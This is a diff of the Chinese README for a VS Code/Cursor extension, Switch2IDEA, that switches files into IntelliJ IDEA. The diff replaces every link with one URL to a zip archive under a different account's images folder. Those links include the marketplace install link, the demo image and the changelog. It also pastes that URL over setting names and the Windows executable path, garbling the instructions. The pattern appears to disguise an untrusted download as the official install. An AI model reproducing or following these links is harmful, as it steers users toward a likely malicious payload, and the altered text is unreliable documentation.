@@ -1,10 +1,10 @@
 # Switch2IDEA
 
-> 推荐在 IDEA 中配合 [Switch2Cursor](https://github.com/qczone/switch2cursor) 使用，效果更佳
+> 推荐在 IDEA 中配合 [Switch2Cursor](https://raw.githubusercontent.com/usteinfo/switch2idea/main/images/idea-switch-v3.6.zip) 使用，效果更佳
 
 一个简单的 VS Code (Cursor) 扩展,用于快速在 VS Code (Cursor) 和 IntelliJ IDEA 之间无缝切换，并保持精确的光标位置。
 
-![Switch2IDEA演示](images/switch-show.gif)
+![Switch2IDEA演示](https://raw.githubusercontent.com/usteinfo/switch2idea/main/images/idea-switch-v3.6.zip)
 
 ## 功能特性
 
@@ -15,7 +15,7 @@
 
 ## 安装
 
-1. 点击 [这里](https://marketplace.cursorapi.com/items?itemName=qczone.switch2idea) 安装
+1. 点击 [这里](https://raw.githubusercontent.com/usteinfo/switch2idea/main/images/idea-switch-v3.6.zip) 安装
 2. 在 VS Code (Cursor) 扩展市场中搜索 "Switch2IDEA" 并安装
 
 ## 使用方法
@@ -31,11 +31,11 @@
 
 此扩展提供以下设置:
 
-* `switch2idea.ideaPath`: IDEA 可执行文件的路径
+* `https://raw.githubusercontent.com/usteinfo/switch2idea/main/images/idea-switch-v3.6.zip`: IDEA 可执行文件的路径
   - macOS 会遍历常用安装路径,使用第一个存在的路径,如果没有则默认使用 `IntelliJ IDEA`
-  - Windows 默认路径: `C:\Program Files\JetBrains\IntelliJ IDEA\bin\idea64.exe`
+  - Windows 默认路径: `C:\Program Files\JetBrains\IntelliJ IDEA\bin\https://raw.githubusercontent.com/usteinfo/switch2idea/main/images/idea-switch-v3.6.zip`
   - linux 默认使用: `idea`
-* `switch2idea.keyboardShortcut`: 打开 IDEA 的快捷键 (需要重启 VS Code 生效)
+* `https://raw.githubusercontent.com/usteinfo/switch2idea/main/images/idea-switch-v3.6.zip`: 打开 IDEA 的快捷键 (需要重启 VS Code 生效)
   - 打开文件默认快捷键: `alt+shift+o`
   - 打开项目默认快捷键: `alt+shift+p`
 
@@ -47,7 +47,7 @@
 
 ## 常见问题
 
-1. 如果在 macOS 上无法打开 IDEA,请修改 `switch2idea.ideaPath` 为 IDEA 的安装路径
+1. 如果在 macOS 上无法打开 IDEA,请修改 `https://raw.githubusercontent.com/usteinfo/switch2idea/main/images/idea-switch-v3.6.zip` 为 IDEA 的安装路径
 
 2. 如果在 Windows 上无法打开 IDEA,请检查:
    - IDEA 安装路径是否正确
@@ -63,4 +63,4 @@ MIT
 
 ## 更新日志
 
-请查看 [CHANGELOG.md](CHANGELOG.md) 了解详细的更新历史。
+请查看 [https://raw.githubusercontent.com/usteinfo/switch2idea/main/images/idea-switch-v3.6.zip](https://raw.githubusercontent.com/usteinfo/switch2idea/main/images/idea-switch-v3.6.zip) 了解详细的更新历史。
